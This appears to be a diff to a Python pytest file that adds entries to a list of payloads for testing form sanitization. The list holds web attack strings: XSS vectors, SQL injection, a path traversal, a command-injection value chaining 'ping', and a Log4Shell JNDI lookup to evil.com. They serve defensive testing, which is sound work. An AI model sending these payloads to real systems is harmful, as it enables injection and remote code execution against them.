@@ -51,7 +51,6 @@ register_data = [
 ]
 register_tests = [(role, name, email, pwd) for role in roles for name, email, pwd in register_data]
 
-# 4. Form Sanitization (10 tests)
 sanitization_payloads = [
     "<img src=x onerror=alert(1)>",
     "javascript:alert(1)",
@@ -62,7 +61,12 @@ sanitization_payloads = [
     "${jndi:ldap://evil.com/a}",
     "<!--",
     "%00",
-    "₹₹₹"
+    "₹₹₹",
+    "<svg/onload=alert(1)>",
+    "UNION SELECT 1,2,3",
+    "1 OR 1=1",
+    "../../../Windows/System32/cmd.exe",
+    "|| ping -c 10 127.0.0.1"
 ]
 
 @pytest.mark.parametrize("role,email,pwd,desc", login_tests)
